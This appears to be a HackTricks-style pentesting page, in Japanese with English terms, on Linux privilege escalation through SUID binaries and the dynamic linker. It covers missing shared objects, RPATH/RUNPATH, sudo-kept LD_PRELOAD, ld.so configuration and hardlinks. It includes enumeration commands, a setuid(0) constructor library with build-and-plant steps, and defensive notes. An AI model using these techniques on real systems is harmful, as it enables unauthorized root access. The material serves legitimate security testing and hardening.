# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries は通常、直接的な command execution の観点からレビューされますが、custom SUID programs は dynamic linker 経由でも vulnerable になる可能性があります。共通するテーマは単純です。privileged executable が、lower-privileged user によって influence 可能な path または configuration から code を load します。

このページでは、generic technique patterns に焦点を当てます。missing libraries、writable library directories、`RPATH`/`RUNPATH`、sudo 経由の `LD_PRELOAD`、linker configuration、そして SUID hardlink confusion です。

## Fast Enumeration

まず、通常とは異なる SUID files を探し、それらが dynamically linked かどうかを確認します。
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
標準ではない場所、カスタム application path、package-managed directory 外にある root 所有の binary、書き込み可能な directory から load される dependency に注目します。

有用な writeability チェック:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

一部の custom SUID binary は、存在しない shared object を load しようとします。missing path が attacker によって control されている directory 配下にある場合、binary は effective user として attacker が用意した code を load する可能性があります。

失敗した library lookup を探します:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
バイナリが書き込み可能なパスで `libexample.so` を検索する場合、最小限の検証用ライブラリでは constructor を使用できます。検証中は影響の証明を無害なものにしてください。
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
バイナリがロードしようとする正確なファイル名でビルドする：
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
悪用可能な条件は、library が不足していることだけではありません。attacker は、権限付き loader が受け入れる path に互換性のある shared object を配置できなければなりません。

## Writable Library Directory

すべての dependency が存在していても、それらの解決に使用されるディレクトリのいずれかが writable である場合があります。これにより、読み込まれる library を置き換えたり、同じ名前の優先度が高い library を配置したりできる可能性があります。

dependency paths を確認します：
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
ディレクトリが writable の場合は、lab で copy-safe な approach を使って検証してください。live host 上で system libraries を置き換えると、authentication、package management、または boot-critical services が壊れる可能性があります。

## RPATH and RUNPATH

`RPATH` と `RUNPATH` は、loader に libraries の検索場所を指示する dynamic-section entries です。attacker が writable な directories を指している場合、SUID programs では危険です。

検出方法:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
リスクのある出力例:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib` が書き込み可能で、バイナリが `libcustom.so` を必要とする場合、attacker はそこに悪意のある `libcustom.so` を配置できる可能性があります：
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` と `RUNPATH` は、すべての解決処理の詳細において同一ではありませんが、privilege-escalation の review では実質的な疑問は同じです。SUID binary は、attacker が書き込み可能な directory から library name を検索するでしょうか？

## LD_PRELOAD、LD_LIBRARY_PATH と SUID

通常の program では、`LD_PRELOAD` と `LD_LIBRARY_PATH` によって shared object の loading を強制または影響させることができます。SUID program の場合、dynamic loader は通常 secure-execution mode に入り、危険な environment variable を無視します。

つまり、user が `LD_PRELOAD` を設定できるというだけでは、通常の SUID binary は一般に vulnerable ではありません。
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
一般的な例外は sudo の設定ミスです。`sudo -l` で `LD_PRELOAD` や `LD_LIBRARY_PATH` などの変数が保持されることが示される場合、sudo で許可された command は attacker-controlled code を load できる可能性があります:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
これらのケースを混同しないでください。

- 通常の SUID binary に対する `LD_PRELOAD`：通常は secure execution によってブロックされます。
- sudo によって保持される `LD_PRELOAD`：悪用できる可能性があります。
- writable path に存在しない `.so`：SUID binary がその path を自然に load する場合は悪用できます。
- writable directory を指す `RPATH`/`RUNPATH`：必要な library を制御できる場合は悪用できます。
- `/etc/ld.so.preload` または linker config への write access：system-wide に影響し、影響度が高いです。

## Linker Configuration

dynamic linker は、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、linker cache、場合によっては `/etc/ld.so.preload` などの system configuration も読み込みます。

High-value checks：
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
書き込み可能な linker 設定は、単一の脆弱な SUID binary よりも通常は深刻です。これは、多数の dynamically linked process に影響を与える可能性があるためです。特に `/etc/ld.so.preload` は、privileged process に shared object を強制的に読み込ませられるため危険です。

## SUID Hardlink Confusion

Hardlink によって、同じ SUID inode が複数の名前で存在しているように見せることができます。これは、privileged helper を隠したり、cleanup を混乱させたり、単純な path-based review を回避したりする際に役立ちます。

複数の link を持つ SUID file を検索します。
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
同じ inode へのすべてのパスを確認します:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
この abuse は、hardlink が permissions を変更することではありません。abuse の本質は path confusion です。privileged inode が、defenders や scripts が想定していない name を通じて到達可能になる場合があります。inode と hardlink の workflow の詳細については、[Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) を参照してください。

## Defensive Notes

- SUID binaries は最小限にし、audit を実施し、可能な限り package-managed にしてください。
- writable または application-managed な directories を指す `RPATH`/`RUNPATH` entries は避けてください。
- library directories は root-owned にし、regular users が書き込みできないようにしてください。
- sudo 経由で `LD_PRELOAD`、`LD_LIBRARY_PATH`、または同様の loader variables を保持しないでください。
- `/etc/ld.so.preload`、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、および想定外の SUID files を monitor してください。
- hardlinked SUID files を review し、standard system paths 外にある custom SUID wrappers を調査してください。
